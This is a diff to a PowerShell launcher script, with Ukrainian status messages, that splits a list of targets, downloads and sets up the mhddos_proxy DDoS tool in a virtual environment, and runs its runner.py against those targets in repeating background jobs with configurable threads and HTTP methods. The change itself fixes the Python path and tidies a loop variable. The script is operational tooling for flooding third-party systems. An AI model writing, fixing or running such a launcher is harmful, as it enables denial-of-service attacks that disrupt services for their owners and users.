@@ -52,7 +52,7 @@ for ($i = 0; $i -lt $NumberOfTargetsFiles; $i++) {
     ($TargetsList[$s..$e] -join "`n").Trim() | Out-File "$RootPath\tmp\$($TargetFiles[$i])" -NoNewline
 }
 
-Write-MiddleHost "Знайдено $NumberOfTargets цілей" -Here -NoNewline
+Write-MiddleHost "Знайдено унікальних $NumberOfTargets цілей" -Here -NoNewline
 $TargetsList = $null
 
 Write-MiddleHost "Завантаження mhddos_proxy" -NoNewline
@@ -75,13 +75,13 @@ Write-MiddleHost "Створення та активація віртуальн�
 &"$VenvPath\Scripts\activate.ps1"
 
 Write-MiddleHost "Завантаження додаткових компонентів mhddos_proxy" -Here -NoNewline
-&"$PyPath\python.exe" -m pip install -r "$LocalMhddosProxy\requirements.txt" --quiet
+&"$VenvPath\Scripts\python.exe" -m pip install -r "$LocalMhddosProxy\requirements.txt" --quiet
 
 #Write-MiddleHost "Запуск mhddos_proxy" -Here -NoNewline
 $strMethods = "$methods"
 $BackgroundJob = { 
     $StartParams = @{
-        'FilePath' = "$PyPath\python.exe"
+        'FilePath' = "$VenvPath\Scripts\python.exe"
         'ArgumentList' = "$LocalMhddosProxy\runner.py -c $using:FilePath -t $using:threads --http-methods $using:strMethods"
         'NoNewWindow' = $true
         'PassThru' = $true
@@ -100,8 +100,9 @@ try {
         $Multidd = Start-ThreadJob -ScriptBlock $BackgroundJob -Name "Multidd$JobCount"
         Receive-Job -Job $Multidd -Keep
         $null = $jobList.Add( $Multidd )
+        $Multidd = $null
     }
-    $Multidd = $null
+    
     Start-Sleep -Seconds 30 # wait for 20 minutes
 }
 catch { $_ }
